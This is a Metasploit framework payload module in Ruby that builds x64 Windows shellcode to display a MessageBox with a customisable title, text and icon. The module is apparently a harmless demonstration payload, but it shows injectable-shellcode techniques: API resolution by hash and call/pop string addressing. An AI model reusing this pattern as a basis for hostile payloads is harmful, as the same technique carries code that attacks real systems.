##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 313

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::BlockApi_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows MessageBox x64',
      'Description' => 'Spawn a dialog via MessageBox using a customizable title, text & icon',
      'Author'      => [
        'pasta <jaguinaga[at]infobytesec.com>'
      ],
      'License'     => GPL_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64
    ))

    icon_opts = ['NO', 'ERROR', 'INFORMATION', 'WARNING', 'QUESTION']
    register_options(
      [
        OptString.new('TITLE', [true, "Messagebox Title", "MessageBox"]),
        OptString.new('TEXT', [true, "Messagebox Text", "Hello, from MSF!"]),
        OptEnum.new('ICON', [true, "Icon type", icon_opts[0], icon_opts])
      ]
    )
  end

  def generate(_opts = {})
    style = 0x00
    case datastore['ICON'].upcase.strip
      # default = NO
    when 'ERROR'
      style = 0x10
    when 'QUESTION'
      style = 0x20
    when 'WARNING'
      style = 0x30
    when 'INFORMATION'
      style = 0x40
    end

    exitfunc_asm = %Q^
        xor rcx,rcx
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
        call rbp
      ^
    if datastore['EXITFUNC'].upcase.strip == 'THREAD'
      exitfunc_asm = %Q^
        mov ebx, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetVersion')}
        call rbp
        add rsp,0x28
        cmp al,0x6
        jl use_exitthread   ; is older than Vista or Server 2003 R2?
        cmp bl,0xe0         ; check if GetVersion change the hash stored in EBX
        jne use_exitthread
        mov ebx, #{Rex::Text.block_api_hash('ntdll.dll', 'RtlExitUserThread')}

        use_exitthread:
        push 0
        pop rcx
        mov r10d,ebx
        call rbp
      ^
    end
    payload_asm = %Q^
      cld
      and rsp,0xfffffffffffffff0
      call start_main
      #{asm_block_api}
    start_main:
      pop rbp
      call get_user32
      db "user32.dll", 0x00
    get_user32:
      pop rcx
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
      call rbp
      mov r9, #{style}
      call get_text
      db "#{datastore['TEXT']}", 0x00
    get_text:
      pop rdx
      call get_title
      db "#{datastore['TITLE']}", 0x00
    get_title:
      pop r8
      xor rcx,rcx
      mov r10d, #{Rex::Text.block_api_hash('user32.dll', 'MessageBoxA')}
      call rbp
    exitfunk:
      #{exitfunc_asm}
    ^
    payload_data = Metasm::Shellcode.assemble(Metasm::X64.new, payload_asm).encode_string
    return payload_data
  end
end
